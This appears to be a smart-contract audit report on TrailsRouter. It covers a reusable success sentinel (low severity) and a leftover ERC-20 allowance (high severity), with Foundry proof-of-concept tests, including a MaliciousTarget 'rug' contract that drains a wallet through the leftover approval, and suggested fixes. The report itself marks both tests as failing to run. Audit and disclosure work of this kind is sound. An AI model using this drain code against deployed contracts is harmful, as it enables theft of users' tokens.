# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
INVARIANT RUN 


 **Derived From** : After a successful call to validateOpHashAndSweep(opHash, token, recipient), the success sentinel for that opHash is consumed (cleared), so that subsequent calls to validateOpHashAndSweep with the same opHash must revert due to a missing sentinel.

[L-1]. Success sentinel not cleared in TrailsRouter.validateOpHashAndSweep allows repeated sweeps under same opHash
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: RequiresRole



 **Derived From** : For ERC-20 tokens (token != address(0)), after a successful call to _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance) executed via injectAndCall or injectSweepAndCall, the allowance that address(this) has granted to target for token SHOULD be zero; i.e., IERC20(token).allowance(address(this), target) == 0, so no residual approval remains beyond the authorised call.

[H-2]. _injectAndExecuteCall leaves unlimited ERC20 allowance to target, enabling later unauthorized token theft
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 0
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : After a successful call to validateOpHashAndSweep(opHash, token, recipient), the success sentinel for that opHash is consumed (cleared), so that subsequent calls to validateOpHashAndSweep with the same opHash must revert due to a missing sentinel.

## [L-1]. Success sentinel not cleared in TrailsRouter.validateOpHashAndSweep allows repeated sweeps under same opHash

### Finding Severity Justification: The reported behavior is real: validateOpHashAndSweep only checks that the success sentinel for a given opHash is set and does not clear it, so that slot can be reused multiple times. However, opHash is not derived from user input in this contract; it is supplied by the trusted Sequence delegated extension / wallet kernel and is not documented to be single‑use authorization. The function is callable only via delegatecall from the wallet, meaning only the wallet’s own configured modules (under user control and Merkle-encoded policies) can invoke it. Reusing a success flag in that context is a design decision about how the wallet’s policy engine interprets opHash, not a bug that lets an untrusted attacker drain arbitrary users’ funds. There is no direct, permissionless asset theft path—only potential over-sweep if a trusted module misconfigures its opHash semantics. That fits Code4rena’s "governance / configuration" or minor logic-risk category, i.e., Low (QA) rather than Medium or High.
## Derived From Pattern/Invariant
After a successful call to validateOpHashAndSweep(opHash, token, recipient), the success sentinel for that opHash is consumed (cleared), so that subsequent calls to validateOpHashAndSweep with the same opHash must revert due to a missing sentinel.

## Exploit Type
AuthByPass

## Location
TrailsRouter.validateOpHashAndSweep

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The TrailsRouter uses a per-opHash success sentinel stored via Tstorish to gate fee/balance sweeps in validateOpHashAndSweep. The intended behavior (per invariant) is that this sentinel is single-use: after one successful sweep, the sentinel should be cleared so that any further validateOpHashAndSweep with the same opHash reverts.

Current implementation in TrailsRouter.validateOpHashAndSweep only reads the sentinel and never clears it:

```solidity
function validateOpHashAndSweep(bytes32 opHash, address _token, address _recipient)
    public
    payable
    onlyDelegatecall
{
    uint256 slot = TrailsSentinelLib.successSlot(opHash);
    if (_getTstorish(slot) != TrailsSentinelLib.SUCCESS_VALUE) {
        revert SuccessSentinelNotSet();
    }
    sweep(_token, _recipient);
}
```

There is no call to `_clearTstorish(slot)` or equivalent. As a result, once a sentinel is set to SUCCESS_VALUE for a given opHash (by TrailsRouterShim or another Tstorish-based module executed via delegatecall), it remains set indefinitely in that wallet's storage context.

Any entity that can cause the wallet to delegatecall into TrailsRouter.validateOpHashAndSweep with the same opHash can repeatedly call it, and each call will pass the sentinel check and sweep the entire current balance of the specified token to an arbitrary recipient. This breaks the intended one-time gating semantics and allows re-use of old authorization state for later, unrelated balances.

## Impact
Because `validateOpHashAndSweep` only checks (and never clears) the success sentinel in `Tstorish` storage, a sentinel set for a given `opHash` remains valid indefinitely for that wallet storage context. Any entity that can cause the wallet to delegatecall into `TrailsRouter.validateOpHashAndSweep` with that same `opHash` (i.e., the wallet owner or a configured, trusted Sequence module) can repeatedly call it and sweep the wallet’s entire balance of the specified token to arbitrary recipients over time, without requiring any new success recording for that `opHash`. This breaks the expected one-time gating semantics for `opHash`-scoped authorization and can lead to over-sweeping of future balances if higher-level policy logic assumes `opHash` is single-use. However, it does not introduce a new permissionless attacker: only already-authorized modules/owners operating under the wallet’s policy can invoke this, so the risk is confined to misconfiguration or over-broad interpretation of `opHash` semantics rather than arbitrary third-party theft.

## Command to Run Test


## Proof of Concept
1. Deploy a `TrailsRouter` instance R.
2. Deploy a `Wallet` contract W that:
   - holds ERC20 balances in its own storage (address W), and
   - exposes a `delegateInto(address target, bytes calldata data)` function that performs `target.delegatecall(data)`.
3. Deploy a `SentinelSetter` contract S that inherits `Tstorish` and has a `setSuccess(bytes32 opHash)` function which computes `slot = TrailsSentinelLib.successSlot(opHash)` and writes `TrailsSentinelLib.SUCCESS_VALUE` to that slot via `_setTstorish`.
4. Deploy a mock ERC20 token T and mint 100 tokens to W.
5. From an externally owned account (EOA), call `W.delegateInto(S, abi.encodeWithSignature("setSuccess(bytes32)", H))` for some chosen `opHash` H. Because the call is a `delegatecall`, S’s Tstorish logic writes the success sentinel for H into W’s storage context.
6. Still from the EOA, call `W.delegateInto(R, abi.encodeWithSelector(TrailsRouter.validateOpHashAndSweep.selector, H, address(T), recipient1))`. In the `delegatecall` context, `TrailsRouter.validateOpHashAndSweep`:
   - computes the same `successSlot(H)` and reads it via `_getTstorish`; it finds `SUCCESS_VALUE`,
   - passes the sentinel check and calls `sweep`,
   - `sweep` reads W’s token balance (100) and transfers it to `recipient1`.
   After this call, the sentinel at `successSlot(H)` in W’s storage is still set to `SUCCESS_VALUE`.
7. Later, mint another 50 T tokens to W.
8. Call `W.delegateInto(R, abi.encodeWithSelector(TrailsRouter.validateOpHashAndSweep.selector, H, address(T), recipient2))` again with the *same* `opHash` H. Because the sentinel was never cleared, the check succeeds again and `sweep` transfers the new 50-token balance from W to `recipient2`.
9. Steps 7–8 can be repeated indefinitely as long as the sentinel is not overwritten, demonstrating that a single success sentinel can be reused to authorize multiple future sweeps for the same `opHash`.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/TrailsRouter.sol";
import "src/libraries/TrailsSentinelLib.sol";
import "tstorish/Tstorish.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("MockToken", "MTK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Wallet that will hold balances and provide delegatecall entry point
contract TestWallet {
    function delegateInto(address target, bytes calldata data) external {
        (bool ok, bytes memory ret) = target.delegatecall(data);
        require(ok, string(ret));
    }
}

// Helper that can set the success sentinel via Tstorish in the caller's storage
contract SentinelSetter is Tstorish {
    function setSuccess(bytes32 opHash) external {
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        _setTstorish(slot, TrailsSentinelLib.SUCCESS_VALUE);
    }
}

contract SentinelReuseTest is Test {
    TrailsRouter router;
    SentinelSetter setter;
    MockToken token;
    TestWallet wallet;

    address recipient1 = address(0x1);
    address recipient2 = address(0x2);

    function setUp() public {
        router = new TrailsRouter();
        setter = new SentinelSetter();
        token = new MockToken();
        wallet = new TestWallet();

        // Fund wallet with initial tokens
        token.mint(address(wallet), 100e18);
    }

    function test_sentinelCanBeReusedForMultipleSweeps() public {
        bytes32 opHash = keccak256("example-opHash");

        // 1) Set success sentinel in wallet storage via delegatecall into SentinelSetter
        wallet.delegateInto(
            address(setter),
            abi.encodeWithSignature("setSuccess(bytes32)", opHash)
        );

        // Sanity: first sweep should transfer 100 MTK from wallet to recipient1
        wallet.delegateInto(
            address(router),
            abi.encodeWithSelector(
                TrailsRouter.validateOpHashAndSweep.selector,
                opHash,
                address(token),
                recipient1
            )
        );

        assertEq(token.balanceOf(recipient1), 100e18, "first sweep should move 100 MTK");

        // 2) Mint new tokens to the wallet
        token.mint(address(wallet), 50e18);

        // 3) Second sweep using the *same* opHash should also succeed, since sentinel was never cleared
        wallet.delegateInto(
            address(router),
            abi.encodeWithSelector(
                TrailsRouter.validateOpHashAndSweep.selector,
                opHash,
                address(token),
                recipient2
            )
        );

        assertEq(token.balanceOf(recipient2), 50e18, "second sweep should move 50 MTK");

        // If the sentinel were single-use and correctly consumed, the second call
        // should have reverted with SuccessSentinelNotSet instead of sweeping again.
    }
}


## Suggested Mitigation
If the intended invariant is that each `opHash` only authorizes a single sweep, `validateOpHashAndSweep` should consume the corresponding success sentinel after a successful check so it cannot be reused:

function validateOpHashAndSweep(bytes32 opHash, address _token, address _recipient)
    public
    payable
    onlyDelegatecall
{
    uint256 slot = TrailsSentinelLib.successSlot(opHash);
    if (_getTstorish(slot) != TrailsSentinelLib.SUCCESS_VALUE) {
        revert SuccessSentinelNotSet();
    }

    // Consume the sentinel to enforce one-time use per opHash
    _clearTstorish(slot);

    sweep(_token, _recipient);
}

Before adopting this change, the team should confirm that no existing flows rely on multi-use semantics for a single `opHash`. If such reuse is required in some scenarios, consider:
- either deriving a fresh `opHash` per logical sweep operation at the policy/Sequence layer, or
- extending the sentinel scheme to encode a usage counter or epoch instead of a simple boolean, and updating/clearing it according to the desired authorization model.

In all cases, the contract should clearly document whether sentinels are single-use or multi-use to prevent misconfiguration in higher-level modules.





 **Derived From** : For ERC-20 tokens (token != address(0)), after a successful call to _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance) executed via injectAndCall or injectSweepAndCall, the allowance that address(this) has granted to target for token SHOULD be zero; i.e., IERC20(token).allowance(address(this), target) == 0, so no residual approval remains beyond the authorised call.

## [H-2]. _injectAndExecuteCall leaves unlimited ERC20 allowance to target, enabling later unauthorized token theft

### Finding Severity Justification: The report correctly identifies that `_injectAndExecuteCall` grants an ERC20 allowance from `address(this)` to an arbitrary `target` using `SafeERC20.forceApprove(erc20, target, callerBalance)` and never revokes it. In delegatecall context (the primary, intended use: `injectAndCall` and `_injectAndCallDelegated` from Sequence v3 wallets), `address(this)` is the wallet, so a malicious or later‑compromised `target` can unilaterally call `transferFrom(wallet, attacker, allowance)` at any time after the authorized intent completes, draining tokens up to the granted allowance without any further user consent. This is a direct asset theft vulnerability and breaks the intent‑scoped authorization model. The standalone `injectSweepAndCall` path also leaves residual allowance from the router implementation, which can lead to theft of tokens later held by the router contract, though that is a secondary impact. Because the allowance persists across transactions and enables unauthorized token transfers, the impact is loss of user funds, which meets Code4rena’s High severity definition.
## Derived From Pattern/Invariant
For ERC-20 tokens (token != address(0)), after a successful call to _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance) executed via injectAndCall or injectSweepAndCall, the allowance that address(this) has granted to target for token SHOULD be zero; i.e., IERC20(token).allowance(address(this), target) == 0, so no residual approval remains beyond the authorised call.

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The balance-injection helper `_injectAndExecuteCall` is used by both injectSweepAndCall (standalone) and injectAndCall/_injectAndCallDelegated (delegatecall context in wallets). In the ERC-20 branch it is implemented as:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    ...
    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(...);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(...);
        if (!success) revert TargetCallFailed(result);
    }
}
```

The router (or wallet, in delegatecall context) sets allowance for `target` equal to `callerBalance` using `forceApprove`, but **never resets this approval back to zero** after the target call completes.

Consequences:
- In standalone usage (injectSweepAndCall), the TrailsRouter implementation contract holds user tokens. After a single call, `target` permanently retains an allowance equal to `callerBalance` from the router for that token. Any future tokens sent to the router (by any user) can be stolen by `target` using `transferFrom` up to the existing allowance.
- In delegatecall usage (injectAndCall or _injectAndCallDelegated), `address(this)` is the caller wallet (e.g., a Sequence v3 smart wallet). The router grants `target` an allowance of `callerBalance` directly from the wallet. After the authorized call, `target` can later call `ERC20(token).transferFrom(wallet, attacker, allowance)` at any time, draining the wallet's funds up to that allowance without any new user signature.

This directly violates the invariant that approvals should not persist beyond the authorized call and breaks the intent-scoped authorization model: a single intent execution grants a reusable, off-chain-controllable allowance to `target`.

## Impact
After `_injectAndExecuteCall` executes in the ERC‑20 branch, the contract leaves a nonzero `IERC20(token).allowance(address(this), target)` equal to `callerBalance` and never clears it. In delegatecall usage (the primary Trails use case via `injectAndCall` / `_injectAndCallDelegated`), `address(this)` is the user’s Sequence wallet/intent contract. This means a target that was legitimately called once under a user‑signed intent now holds a standing ERC‑20 allowance from that wallet and can later call `transferFrom(wallet, attacker, allowance)` at any time, without any additional user signature, draining any tokens the wallet holds (now or in the future) up to that allowance. In standalone `injectSweepAndCall` usage, the TrailsRouter implementation itself holds user tokens for the duration of the call; the target retains an allowance from the router and can later steal any tokens that end up in the router balance (from any user) up to that allowance. Because this leftover approval persists across transactions and is fully under the target’s control, it enables direct, repeatable theft of user assets and violates the intent‑scoped authorization model, qualifying as a High‑severity loss of funds.

## Command to Run Test


## Proof of Concept
Below is a revised PoC that:
- Shows the leftover allowance after `_injectAndExecuteCall` in the standalone router case is reusable to steal later deposits of *any* user.
- Additionally demonstrates the delegatecall (wallet) case by simulating `_injectAndExecuteCall` in a mock wallet that uses the router via delegatecall.

Standalone router case:
1. Deploy `TrailsRouter` R, `MockToken` T (ERC20), and `MaliciousTarget` M.
2. User U mints 100 T and approves R for unlimited T.
3. U calls `R.injectSweepAndCall(T, M, abi.encodeWithSignature("doSomething()"), 0, 0)`.
   - `_getBalance(T, U)` returns 100; `_safeTransferFrom` moves 100 T from U to R.
   - `_injectAndExecuteCall` sets `T.allowance(R, M) = 100` via `SafeERC20.forceApprove`.
   - M’s `doSomething()` does nothing and returns; the allowance is **not** cleared.
4. Later, an unrelated victim V sends 100 T directly to R (e.g. via a different integration).
   - R now holds 200 T, still with `allowance(R, M) = 100`.
5. The attacker, controlling M, calls `M.rug(T, R, attacker)`:
   - `allowance = T.allowance(R, M);`
   - `T.transferFrom(R, attacker, allowance);`
   The attacker steals 100 T from the router; some of these tokens originated from V.

Delegatecall wallet case:
1. Deploy `TrailsRouter` R and `MockWallet` W that holds ERC20 balances and exposes a function `walletInjectAndCall` which delegatecalls into R’s `injectAndCall` (so that `address(this)` inside R is W).
2. Deploy `MockToken` T and `MaliciousTarget` M.
3. Fund W with 1,000 T by minting to W.
4. Call `W.walletInjectAndCall(T, M, abi.encodeWithSignature("doSomething()"), 0, 0)`.
   - Inside the delegatecall, `_getSelfBalance(T)` reads W’s balance (1,000).
   - `_injectAndExecuteCall` sets `T.allowance(W, M) = 1,000` via `forceApprove`, then calls `M.doSomething()`.
   - The allowance is **not** cleared.
5. At any later time, without any new signature from the user, the attacker calls `M.rug(T, W, attacker)`:
   - `allowance = T.allowance(W, M); // = 1,000`
   - `T.transferFrom(W, attacker, allowance);`
   The attacker drains up to 1,000 T from W, including any tokens received after the original intent was executed.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("MockToken", "MTK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousTarget {
    function doSomething() external {}

    function rug(address token, address from, address to) external {
        uint256 allowance = IERC20(token).allowance(from, address(this));
        IERC20(token).transferFrom(from, to, allowance);
    }
}

// Simulates a Sequence wallet that delegatecalls into TrailsRouter
contract MockWallet {
    TrailsRouter public router;

    constructor(TrailsRouter _router) {
        router = _router;
    }

    // Delegatecall into TrailsRouter.injectAndCall so that `address(this)` inside
    // the router is this wallet, mimicking the real integration.
    function walletInjectAndCall(
        address token,
        address target,
        bytes calldata callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) external {
        // encode the selector + arguments as expected by TrailsRouter.injectAndCall
        bytes memory data = abi.encodeWithSelector(
            TrailsRouter.injectAndCall.selector,
            token,
            target,
            callData,
            amountOffset,
            placeholder
        );

        (bool ok, bytes memory err) = address(router).delegatecall(data);
        if (!ok) {
            assembly {
                revert(add(err, 0x20), mload(err))
            }
        }
    }
}

contract LeftoverApprovalTest is Test {
    TrailsRouter router;
    MockToken token;
    MaliciousTarget target;
    MockWallet wallet;

    address user = address(0x1);
    address victim = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockToken();
        target = new MaliciousTarget();
        wallet = new MockWallet(router);

        token.mint(user, 100e18);
        token.mint(victim, 100e18);

        vm.prank(user);
        token.approve(address(router), type(uint256).max);

        // Fund the mock wallet for the delegatecall scenario
        token.mint(address(wallet), 1000e18);
    }

    function test_leftoverApprovalStealsFromVictim_standaloneRouter() public {
        // User uses router once via injectSweepAndCall; target gets allowance but does not spend it
        vm.prank(user);
        router.injectSweepAndCall(
            address(token),
            address(target),
            abi.encodeWithSignature("doSomething()"),
            0,
            bytes32(0)
        );

        // Router now holds 100 tokens; target has allowance 100 from router
        assertEq(token.balanceOf(address(router)), 100e18, "router should hold swept tokens");
        assertEq(
            token.allowance(address(router), address(target)),
            100e18,
            "target should have leftover allowance"
        );

        // Victim later sends tokens to the router (e.g. via another integration)
        vm.prank(victim);
        token.transfer(address(router), 100e18);
        assertEq(token.balanceOf(address(router)), 200e18, "router now holds victim + user funds");

        // Attacker triggers rug() using leftover approval and steals 100 tokens
        vm.prank(attacker);
        target.rug(address(token), address(router), attacker);

        assertEq(token.balanceOf(attacker), 100e18, "attacker stole 100 tokens");
        assertEq(token.balanceOf(address(router)), 100e18, "router lost 100 tokens");
    }

    function test_leftoverApprovalDrainsWallet_delegatecall() public {
        // Sanity: wallet has 1000 tokens, no allowance to target initially
        assertEq(token.balanceOf(address(wallet)), 1000e18, "wallet funded");
        assertEq(
            token.allowance(address(wallet), address(target)),
            0,
            "no initial allowance"
        );

        // Execute injectAndCall via delegatecall, giving target an allowance from the wallet
        wallet.walletInjectAndCall(
            address(token),
            address(target),
            abi.encodeWithSignature("doSomething()"),
            0,
            bytes32(0)
        );

        // After call, allowance from wallet to target equals wallet balance at injection time
        uint256 leftover = token.allowance(address(wallet), address(target));
        assertEq(leftover, 1000e18, "leftover allowance should equal injected balance");

        // Attacker later uses this allowance to drain the wallet without any new signature
        vm.prank(attacker);
        target.rug(address(token), address(wallet), attacker);

        assertEq(token.balanceOf(attacker), 1000e18, "attacker drained wallet via leftover allowance");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet was fully drained");
    }
}


## Suggested Mitigation
In `_injectAndExecuteCall`, the ERC‑20 branch should ensure that any approval granted to `target` is strictly scoped to the in‑flight call and fully cleared afterward, regardless of success or failure. A robust pattern is:

- If you must use `approve`/`forceApprove`, set the allowance to `0` *before* setting it to `callerBalance` (to accommodate non‑standard ERC‑20s that require zeroing before updating), and then always set it back to `0` in a `finally`-style block after the external call.

Concretely:

```solidity
if (token != address(0)) {
    IERC20 erc20 = IERC20(token);

    // Be maximally compatible with ERC-20s that require zeroing allowances first
    SafeERC20.forceApprove(erc20, target, 0);
    SafeERC20.forceApprove(erc20, target, callerBalance);

    (bool success, bytes memory result) = target.call(callData);

    // Unconditionally clear allowance so no residual approval remains
    SafeERC20.forceApprove(erc20, target, 0);

    emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
    if (!success) revert TargetCallFailed(result);
}
```

Alternatively, for stronger safety you can avoid approvals entirely by changing the pattern so that `_injectAndExecuteCall` transfers tokens directly to `target` before the call (or uses a trusted pull pattern where the target calls back into the router within the same transaction), but this is a larger design change. At minimum, the router should guarantee the post‑condition:
`IERC20(token).allowance(address(this), target) == 0` after every execution of `_injectAndExecuteCall` in the ERC‑20 branch, and this invariant should be covered by tests.



